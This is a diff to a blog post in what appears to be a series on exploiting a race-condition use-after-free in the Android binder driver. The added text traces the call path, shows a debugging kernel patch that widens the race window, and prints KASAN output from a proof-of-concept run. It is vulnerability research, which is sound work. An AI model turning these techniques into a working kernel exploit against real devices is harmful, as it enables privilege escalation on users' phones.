@@ -402,9 +402,32 @@ static bool binder_dec_ref_olocked(struct binder_ref *ref, int strong)
 }
 ```
 
-Simple, it should happen as long we are the only thread pointing at the server (the node). In that case, our plan should simply work when we use it like so. To reiterate the flow, the vulnerability seems to be a check of `w->type` while being out of the `proc` lock. We can enter the flow of `binder_update_ref_for_handle()` in the same time, and then reacquire the lock, and free the node (thus also freeing `work`!), achieving a UAF on `work` when reading `w->type` (which later on effects what happens with `w`).
+Simple, it should happen as long as the server (which holds the ref to our client node) is the only one holding it. In that case, our plan should simply work when we use it like so. To reiterate the flow, the vulnerability seems to be a check of `w->type` while being out of the `proc` lock. We can enter the flow of `binder_update_ref_for_handle()` in the same time, and then reacquire the lock, and free the node (thus also freeing `work`!), achieving a UAF on `work` when reading `w->type` (which later on effects what happens with `w`).
 
-As a first step, we want to create a POC that'll demonstrate with KASAN that we can perform a UAF with what we think. Let's start by understanding the full call flow we want. We know how to reach the flow of `binder_release_work()`, but how can we reach `binder_update_ref_for_handle()`? 
+As a first step, we want to create a POC that'll demonstrate with KASAN that we can perform a UAF with what we think. Let's start by understanding the full call flow we want. 
+
+Let's start with reaching `binder_release_work`:
+```c
+static int binder_thread_release(struct binder_proc *proc,
+                                 struct binder_thread *thread) {
+  struct binder_transaction *t;
+  struct binder_transaction *send_reply = NULL;
+  int active_transactions = 0;
+  struct binder_transaction *last_t = NULL;
+
+  [...]
+  binder_release_work(proc, &thread->todo);
+  binder_thread_dec_tmpref(thread);
+  return active_transactions;
+}
+```
+
+Our familiar friend from before calls it! This means we know how to trigger it easily: 
+```c
+ioctl(fd, BINDER_THREAD_EXIT, NULL);
+```
+
+How can we reach `binder_update_ref_for_handle()`? 
 
 First, for our use case it is wrapped in:
 ```c
@@ -810,4 +833,113 @@ void _client_race(void) {
 ```
 
 Let's see if we get a *KASAN* hit:
-... (WIP).
+...
+Well, it ran for a while, and we did not get a hit. To see whether it is the race window that troubles us, I patched the kernel:
+```c
+static void binder_release_work(struct binder_proc *proc,
+                                struct list_head *list) {
+  struct binder_work *w;
+
+  while (1) {
+    w = binder_dequeue_work_head(proc, list);
+    if (!w)
+      return;
+
+	// --> A sleep of 0.5 - we'll surely release binder_node
+	// --> by then!
+    usleep(500000); 
+    switch (w->type) {
+    case BINDER_WORK_TRANSACTION: {
+    [...]
+    }
+  }
+}
+```
+
+And alas:
+```bash
+~ $ ./poc
+[*] Initializing client fd...
+[*] Initializing ctx mgr fd...
+[*] Became context manager, waiting for client...
+[*] Sending initial transaction to create a binder_ref...
+[*] Read buffer from transaction: 0x75cf79d000
+[*] Client triggering race via binder_release_work...
+[*] Context manager triggering race via free buffer...
+==================================================================
+BUG: KASAN: use-after-free in binder_release_work+0x27c/0x398
+Read of size 4 at addr ffffffc0d8db0318 by task poc/638
+
+CPU: 0 PID: 638 Comm: poc Not tainted 4.14.172+ #3
+Hardware name: linux,dummy-virt (DT)
+Call trace:
+[<        (ptrval)>] dump_backtrace+0x0/0x6f8
+[<        (ptrval)>] show_stack+0x1c/0x24
+[<        (ptrval)>] dump_stack+0xb0/0xf0
+[<        (ptrval)>] print_address_description+0x60/0x24c
+[<        (ptrval)>] kasan_report+0x14c/0x2f0
+[<        (ptrval)>] __asan_report_load4_noabort+0x1c/0x24
+[<        (ptrval)>] binder_release_work+0x27c/0x398
+[<        (ptrval)>] binder_thread_release+0x308/0x59c
+[<        (ptrval)>] binder_ioctl+0x964/0x45b4
+[<        (ptrval)>] do_vfs_ioctl+0xc5c/0x13e0
+[<        (ptrval)>] SyS_ioctl+0xa4/0xc0
+Exception stack(0xffffffc0d8e57ec0 to 0xffffffc0d8e58000)
+7ec0: 0000000000000006 0000000040046208 0000000000000000 00000000fffffff8
+7ee0: 0000000000000000 0000000000409315 5d2a5b6d36335b1b 65696c436d305b1b
+7f00: 000000000000001d 617220676e697265 6976206563617220 7265646e69622061
+7f20: 657361656c65725f 2e2e2e6b726f775f 206e6f6974636173 7461657263206f74
+7f40: 646e696220612065 2e2e6665725f7265 0000000000000000 0000000000000001
+7f60: 0000007ff51d6498 000000000040094c 0000007ff51d64a8 0000000000000000
+7f80: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
+7fa0: 0000000000000000 0000007ff51d63d0 0000000000400940 0000007ff51d63d0
+7fc0: 0000000000400e58 0000000060001000 0000000000000006 000000000000001d
+7fe0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
+[<        (ptrval)>] el0_svc_naked+0x34/0x38
+
+Allocated by task 638:
+ kasan_kmalloc+0xdc/0x184
+ binder_new_node+0x70/0x810
+ binder_transaction+0x2c7c/0x5000
+ binder_thread_write+0x6f4/0x3540
+ binder_ioctl+0xe04/0x45b4
+ do_vfs_ioctl+0xc5c/0x13e0
+ SyS_ioctl+0xa4/0xc0
+ el0_svc_naked+0x34/0x38
+
+Freed by task 639:
+ kasan_slab_free+0xa4/0x198
+ kfree+0x64/0x1e8
+ binder_update_ref_for_handle+0x2e4/0x724
+ binder_transaction_buffer_release+0x3c0/0x6c4
+ binder_thread_write+0xf1c/0x3540
+ binder_ioctl+0xe04/0x45b4
+ do_vfs_ioctl+0xc5c/0x13e0
+ SyS_ioctl+0xa4/0xc0
+ el0_svc_naked+0x34/0x38
+
+The buggy address belongs to the object at ffffffc0d8db0300
+ which belongs to the cache kmalloc-128 of size 128
+The buggy address is located 24 bytes inside of
+ 128-byte region [ffffffc0d8db0300, ffffffc0d8db0380)
+The buggy address belongs to the page:
+page:ffffffbf03636c00 count:1 mapcount:0 mapping:          (null) index:0x0
+flags: 0x4000000000000200(slab)
+raw: 4000000000000200 0000000000000000 0000000000000000 0000000180100010
+raw: dead000000000100 dead000000000200 ffffffc0dac01c00 0000000000000000
+page dumped because: kasan: bad access detected
+
+Memory state around the buggy address:
+ ffffffc0d8db0200: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+ ffffffc0d8db0280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+>ffffffc0d8db0300: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+                            ^
+ ffffffc0d8db0380: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+ ffffffc0d8db0400: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
+==================================================================
+Disabling lock debugging due to kernel taint
+binder: unexpected work type, 4, not freed
+binder: undelivered TRANSACTION_COMPLETE
+```
+
+This blog post has gotten long enough, so, in the next entry, we'll cover how we lengthen the race window, and keep going from there. In the end of the series, of course, we'll have a full exploit of the CVE, with a working race. 'Till next time.
